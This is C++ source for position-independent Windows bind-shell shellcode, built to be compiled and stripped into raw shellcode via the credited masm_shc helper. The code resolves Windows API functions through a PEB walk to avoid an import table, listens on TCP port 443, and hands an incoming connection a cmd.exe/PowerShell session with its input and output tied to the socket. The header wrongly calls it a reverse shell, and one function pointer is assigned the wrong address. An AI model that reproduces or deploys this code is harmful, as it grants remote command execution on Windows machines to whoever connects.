/*
Author: nozerobit (Coded the bind shell)
Credits: https://github.com/hasherezade/masm_shc (A helper utility for creating shellcodes. Cleans MASM file generated by MSVC, gives refactoring hints.)
Description: Position-Independent Code (PIC) for Windows x86/x64 Reverse Shell Shellcodes

peb_lookup.h: https://github.com/hasherezade/masm_shc/blob/master/demos/peb_lookup.h

Example:
ml64 windows_reverse_tcp64.asm /link /entry:main /section:.text,ERW
ml windows_reverse_tcp32.asm /link /entry:main /section:.text,ERW
*/

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <Windows.h>
#include "peb_lookup.h"

typedef struct
{
    decltype(&LoadLibraryA) _LoadLibraryA;
    decltype(&GetProcAddress) _GetProcAddress;
    decltype(&CreateProcessW) _CreateProcessW;
    decltype(&ExitProcess) _ExitProcess;
    decltype(&WaitForSingleObject) _WaitForSingleObject;
    decltype(&CloseHandle) _CloseHandle;
} t_mini_iat;

typedef struct
{
    decltype(&WSAStartup) _WSAStartup;
    decltype(&socket) _socket;
    decltype(&inet_addr) _inet_addr;
    decltype(&bind) _bind;
    decltype(&listen) _listen;
    decltype(&accept) _accept;
    decltype(&recv) _recv;
    decltype(&send) _send;
    decltype(&closesocket) _closesocket;
    decltype(&htons) _htons;
    decltype(&htonl) _htonl;
    decltype(&getaddrinfo) _getaddrinfo;
    decltype(&freeaddrinfo) _freeaddrinfo;
    decltype(&WSACleanup) _WSACleanup;
    decltype(&WSAConnect) _WSAConnect;
    decltype(&WSASocketA) _WSASocketA;
    decltype(&WSAAccept) _WSAAccept;
} t_socket_iat;


bool init_iat(t_mini_iat& iat)
{
    LPVOID base = get_module_by_name((const LPWSTR)L"kernel32.dll");
    if (!base) {
        return false;
    }

    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
    if (!load_lib) {
        return false;
    }
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
    if (!get_proc) {
        return false;
    }

    LPVOID create_proc = get_func_by_name((HMODULE)base, (LPSTR)"CreateProcessW");
    if (!create_proc) {
        return false;
    }

    LPVOID exit_proc = get_func_by_name((HMODULE)base, (LPSTR)"ExitProcess");
    if (!exit_proc) {
        return false;
    }

    LPVOID wait_proc = get_func_by_name((HMODULE)base, (LPSTR)"WaitForSingleObject");
    if (!wait_proc) {
        return false;
    }

    LPVOID close_han = get_func_by_name((HMODULE)base, (LPSTR)"CloseHandle");
    if (!close_han) {
        return false;
    }

    iat._LoadLibraryA = reinterpret_cast<decltype(&LoadLibraryA)>(load_lib);
    iat._GetProcAddress = reinterpret_cast<decltype(&GetProcAddress)>(get_proc);
    iat._CreateProcessW = reinterpret_cast<decltype(&CreateProcessW)>(create_proc);
    iat._ExitProcess = reinterpret_cast<decltype(&ExitProcess)>(create_proc);
    iat._WaitForSingleObject = reinterpret_cast<decltype(&WaitForSingleObject)>(wait_proc);
    iat._CloseHandle = reinterpret_cast<decltype(&CloseHandle)>(close_han);
    return true;
}

bool init_socket_iat(t_mini_iat& iat, t_socket_iat& sIAT)
{
    LPVOID WS232_dll = iat._LoadLibraryA("WS2_32.dll");

    sIAT._WSAStartup = reinterpret_cast<decltype(&WSAStartup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAStartup"));
    sIAT._socket = reinterpret_cast<decltype(&socket)>(iat._GetProcAddress((HMODULE)WS232_dll, "socket"));
    sIAT._inet_addr = reinterpret_cast<decltype(&inet_addr)>(iat._GetProcAddress((HMODULE)WS232_dll, "inet_addr"));
    sIAT._bind = reinterpret_cast<decltype(&bind)>(iat._GetProcAddress((HMODULE)WS232_dll, "bind"));
    sIAT._listen = reinterpret_cast<decltype(&listen)>(iat._GetProcAddress((HMODULE)WS232_dll, "listen"));
    sIAT._accept = reinterpret_cast<decltype(&accept)>(iat._GetProcAddress((HMODULE)WS232_dll, "accept"));
    sIAT._recv = reinterpret_cast<decltype(&recv)>(iat._GetProcAddress((HMODULE)WS232_dll, "recv"));
    sIAT._send = reinterpret_cast<decltype(&send)>(iat._GetProcAddress((HMODULE)WS232_dll, "send"));
    sIAT._closesocket = reinterpret_cast<decltype(&closesocket)>(iat._GetProcAddress((HMODULE)WS232_dll, "closesocket"));
    sIAT._htons = reinterpret_cast<decltype(&htons)>(iat._GetProcAddress((HMODULE)WS232_dll, "htons"));
    sIAT._htonl = reinterpret_cast<decltype(&htonl)>(iat._GetProcAddress((HMODULE)WS232_dll, "htonl"));
    sIAT._getaddrinfo = reinterpret_cast<decltype(&getaddrinfo)>(iat._GetProcAddress((HMODULE)WS232_dll, "getaddrinfo"));
    sIAT._freeaddrinfo = reinterpret_cast<decltype(&freeaddrinfo)>(iat._GetProcAddress((HMODULE)WS232_dll, "freeaddrinfo"));
    sIAT._WSACleanup = reinterpret_cast<decltype(&WSACleanup)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSACleanup"));
    sIAT._WSAConnect = reinterpret_cast<decltype(&WSAConnect)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAConnect"));
    sIAT._WSAAccept = reinterpret_cast<decltype(&WSAAccept)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSAAccept"));
    sIAT._WSASocketA = reinterpret_cast<decltype(&WSASocketA)>(iat._GetProcAddress((HMODULE)WS232_dll, "WSASocketA"));
    return true;
}

int main()
{
    t_mini_iat iat;
    if (!init_iat(iat)) {
        return 1;
    }

    /* Declare and initialize variables */
	WSADATA wsaData;
	struct sockaddr_in address;
	STARTUPINFOW sui = {0};
	PROCESS_INFORMATION pi = {0};

    t_socket_iat sIAT;
    if (!init_socket_iat(iat, sIAT)) {
        return false;
    }

    /* Initialize Winsock */
    int result = sIAT._WSAStartup(MAKEWORD(2,2), &wsaData);
	if (result != 0)
		return EXIT_FAILURE;

    /* Create a TCP listening socket */
    // WSASocketA works, socket() does not
    const SOCKET server_socket = sIAT._WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if (server_socket == INVALID_SOCKET)
	{
		sIAT._WSACleanup();
		return EXIT_FAILURE;
	}

    /*-----------------------------------------  
     *  Set up the sock addr structure (local IP address) that the listening socket
     *  will be bound to. */
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = sIAT._htonl(INADDR_ANY);
    address.sin_port = sIAT._htons(443);

    /*-----------------------------------------
     *  Bind the listening socket to the IP address.
     * and port number specified by the sockaddr structure. */
    result = sIAT._bind(server_socket, (SOCKADDR *) &address, sizeof(SOCKADDR));
	if (result == SOCKET_ERROR)
	{
		sIAT._closesocket(server_socket);
		sIAT._WSACleanup();
		return EXIT_FAILURE;
	}

    /* Make the socket listen for incoming connection requests */
    result = sIAT._listen(server_socket, SOMAXCONN);
	if (result == SOCKET_ERROR)
	{
		sIAT._closesocket(server_socket);
		sIAT._WSACleanup();
		return EXIT_FAILURE;
	}

    ADDRINFO client_address;
    int client_address_len = sizeof(struct sockaddr_in);
    
    /*-----------------------------------------
     *  Accept an incoming connection request on the
     *  listening socket and transfer control to the 
     * accepting socket. */

    const SOCKET client_socket = sIAT._accept(server_socket, (SOCKADDR*)& client_address, &client_address_len);
	if (client_socket == INVALID_SOCKET)
	{
		sIAT._closesocket(server_socket);
		sIAT._WSACleanup();
		return EXIT_FAILURE;
	}

    // Process
    SecureZeroMemory(&sui, sizeof(sui));
    sui.cb = sizeof(sui);
    //SecureZeroMemory(&pi, sizeof(pi));
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = (HANDLE)client_socket;
	sui.hStdOutput = (HANDLE)client_socket;
	sui.hStdError = (HANDLE)client_socket;
    

    // Reference: https://stackoverflow.com/questions/54739938/convert-argument-to-lpwstr-createprocess
    // CreateProcessW
    wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";
    //char cmd[] = "C:\\WINDOWS\\System32\\cmd.exe";
    //char arg[] = "/c powershell.exe";

    // Start the child process. 
    iat._CreateProcessW(cmd,   // No module name (use command line)
        L"/c powershell.exe",        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        TRUE,          // Set handle inheritance to TRUE
        CREATE_NEW_CONSOLE,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &sui,            // Pointer to STARTUPINFO structure
        &pi );           // Pointer to PROCESS_INFORMATION structure
    // Wait until child process exits.
    iat._WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    iat._CloseHandle( pi.hProcess );
    iat._CloseHandle( pi.hThread );
    // Close the socket and terminates the use of the Winsock 2 DLL 
    sIAT._closesocket(server_socket);
    sIAT._closesocket(client_socket);
    sIAT._WSACleanup();
    return EXIT_SUCCESS;
}